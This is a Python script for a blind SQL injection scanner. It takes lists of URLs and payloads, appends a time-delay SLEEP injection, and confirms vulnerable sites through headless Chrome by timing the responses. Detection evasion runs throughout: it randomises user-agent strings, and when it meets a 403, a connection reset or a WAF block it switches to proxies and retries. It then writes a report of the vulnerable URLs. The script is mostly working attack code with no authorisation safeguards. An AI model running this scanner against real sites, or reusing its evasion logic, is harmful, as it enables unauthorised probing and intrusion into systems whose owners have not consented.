#!/usr/bin/python3

import os
import sys
import time
import random
import argparse
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote
from datetime import datetime
from urllib.parse import urlparse
import urllib3
from colorama import Fore, init
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import TimeoutException, WebDriverException

# Initialize colorama
init(autoreset=True)

# User-agents for randomization
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.2 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.70",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
]

# Load proxy list from file
def load_proxies(file_path):
    try:
        with open(file_path, 'r') as file:
            proxies = [line.strip() for line in file if line.strip()]
        return proxies
    except FileNotFoundError:
        print(Fore.RED + f"[!] Proxy file not found: {file_path}")
        sys.exit(1)

def setup_selenium_driver(proxy=None):
    """Setup and return a Selenium Chrome WebDriver with proxy and user-agent options."""
    chrome_options = Options()
    chrome_options.add_argument("--headless")  # Run Chrome in headless mode
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-background-timer-throttling")
    chrome_options.add_argument("--disable-backgrounding-occluded-windows")
    chrome_options.add_argument("--disable-renderer-backgrounding")
    chrome_options.add_argument("--disable-software-rasterizer")

    # Apply proxy settings if provided
    if proxy:
        formatted_proxy = f"http://{proxy}"  # Prefix with protocol
        chrome_options.add_argument(f'--proxy-server={formatted_proxy}')
        print(Fore.CYAN + f"[i] Using Proxy: {formatted_proxy}")

    # Set a random user-agent for each session
    random_user_agent = get_random_user_agent()
    chrome_options.add_argument(f"user-agent={random_user_agent}")

    driver_service = ChromeService(ChromeDriverManager().install(), log_path=os.devnull)
    chrome_options.add_argument("--log-level=3")

    driver = webdriver.Chrome(service=driver_service, options=chrome_options)
    driver.set_page_load_timeout(40)
    driver.set_script_timeout(40)

    return driver

def get_random_user_agent():
    """Return a random user-agent string."""
    return random.choice(USER_AGENTS)

def perform_request_selenium(driver, url, payload, cookie, proxy_list):
    """
    Perform a request using Selenium WebDriver to test for Time-Based Blind SQLi vulnerability.
    Switches to proxies only if blocked or restricted.
    """
    target_url = f"{url}{quote(payload, safe='')}"
    print(Fore.CYAN + f"[→] Scanning URL: {target_url}")

    try:
        # Handle cookies if needed
        if cookie:
            driver.get("about:blank")
            driver.add_cookie({"name": "cookie", "value": cookie, "path": "/"})

        # Initial request without payload for baseline response time
        start_time = time.time()
        driver.get(url)
        end_time = time.time()
        baseline_response_time = end_time - start_time
        print(Fore.CYAN + f"[i] Baseline response time: {baseline_response_time:.2f} seconds")

        # Modified payload for SQLi detection
        time_based_payload = f"{url}{quote(payload + ' /*!SLEEP(10)*/', safe='')}"
        consistent_delay_count = 0

        for attempt in range(3):  # Three attempts to confirm vulnerability
            time.sleep(random.uniform(1, 3))
            start_time = time.time()
            driver.get(time_based_payload)
            end_time = time.time()
            injected_response_time = end_time - start_time

            delay_detected = injected_response_time - baseline_response_time
            print(Fore.CYAN + f"[i] Injected response time: {injected_response_time:.2f} seconds (delay: {delay_detected:.2f} seconds)")

            if delay_detected >= 8:
                consistent_delay_count += 1

        if consistent_delay_count >= 2:
            print(Fore.GREEN + f"[✓] Time-Based Blind SQLi Confirmed: {target_url}")
            return target_url, True

        print(Fore.RED + f"[✗] Not Vulnerable: {target_url}")
        return target_url, False

    except (TimeoutException, WebDriverException) as e:
        # Detect IP block or WAF restriction and switch to proxy
        if "ERR_CONNECTION_RESET" in str(e) or "403" in str(e) or "ERR_PROXY_CONNECTION_FAILED" in str(e):
            print(Fore.YELLOW + f"[!] Block detected for {target_url}. Retrying with a proxy...")
            if proxy_list:  # Check if proxies are available
                new_proxy = random.choice(proxy_list)
                driver.quit()
                new_driver = setup_selenium_driver(proxy=new_proxy)
                return perform_request_selenium(new_driver, url, payload, cookie, proxy_list)
            else:
                print(Fore.RED + f"[!] No proxies available to retry.")
        else:
            print(Fore.RED + f"[!] WebDriverException: {e.msg.splitlines()[0]}")
        return target_url, False
        
def save_results(vulnerable_urls, total_found, total_scanned, start_time):
    """Save the scan results to an HTML report in the specified output folder with the domain name in the filename."""
    if vulnerable_urls:
        # Extract the domain from the first vulnerable URL for the report filename
        domain = urlparse(vulnerable_urls[0]).netloc
    else:
        # Use 'unknown_domain' if no vulnerabilities are found
        domain = "unknown_domain"

    output_dir = os.path.expanduser("~/aungrecon/output/bsqli_results")
    filename = os.path.join(output_dir, f"{domain}_bsqli_report.html")
    os.makedirs(output_dir, exist_ok=True)

    html_content = generate_html_report("Blind SQL Injection", total_found, total_scanned, int(time.time() - start_time), vulnerable_urls)
    with open(filename, 'w') as f:
        f.write(html_content)
    print(Fore.GREEN + f"[✓] Report saved as {filename}")

def generate_html_report(scan_type, total_found, total_scanned, time_taken, vulnerable_urls):
    """Generate a simple HTML report for vulnerabilities found."""
    html_content = f"""
    <html>
    <head><title>{scan_type} Report</title></head>
    <body>
        <h1>{scan_type} Report</h1>
        <p>Total Found: {total_found}</p>
        <p>Total Scanned: {total_scanned}</p>
        <p>Time Taken: {time_taken} seconds</p>
        <h2>Vulnerable URLs</h2>
        <ul>
            {"".join(f'<li>{url}</li>' for url in vulnerable_urls)}
        </ul>
    </body>
    </html>
    """
    return html_content

def main():
    parser = argparse.ArgumentParser(description="Blind SQL Injection Scanner with Selenium and Optional Proxy Support")
    parser.add_argument("-p", "--payload-file", required=True, help="Path to the file containing SQLi payloads")
    parser.add_argument("-u", "--url-file", required=True, help="Path to the file containing URLs to scan")
    parser.add_argument("-c", "--cookie", help="Cookie to include in the GET request (optional)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of concurrent threads (default is 5)")
    parser.add_argument("--proxy-file", help="Path to the file containing proxy addresses (optional)")

    args = parser.parse_args()

    # Load proxies if proxy file is provided
    proxy_list = load_proxies(args.proxy_file) if args.proxy_file else []
    if proxy_list:
        print(Fore.CYAN + "[i] Proxies loaded. Proxy rotation will be enabled if needed.")
    else:
        print(Fore.CYAN + "[i] No proxy file provided. Starting without proxy rotation.")

    # Load URLs and Payloads
    try:
        with open(args.url_file, 'r') as file:
            urls = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"[!] URL file not found: {args.url_file}")
        sys.exit(1)

    try:
        with open(args.payload_file, 'r') as file:
            payloads = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"[!] Payload file not found: {args.payload_file}")
        sys.exit(1)

    # Initialize scan state
    scan_state = {
        'vulnerability_found': False,
        'vulnerable_urls': [],
        'total_found': 0,
        'total_scanned': 0
    }

    print(Fore.CYAN + "[i] Starting Blind SQLi Scan...")

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for url in urls:
            for payload in payloads:
                # Start without a proxy
                driver = setup_selenium_driver(proxy=None)
                futures.append(executor.submit(perform_request_selenium, driver, url, payload, args.cookie, proxy_list))

        for future in futures:
            url_with_payload, vulnerability_detected = future.result()
            if vulnerability_detected:
                scan_state['vulnerable_urls'].append(url_with_payload)
                scan_state['total_found'] += 1
            scan_state['total_scanned'] += 1

    # Save results and cleanup
    save_results(scan_state['vulnerable_urls'], scan_state['total_found'], scan_state['total_scanned'], start_time)
    driver.quit()
    print(Fore.GREEN + "[✓] Scan Complete")

if __name__ == "__main__":
    main()
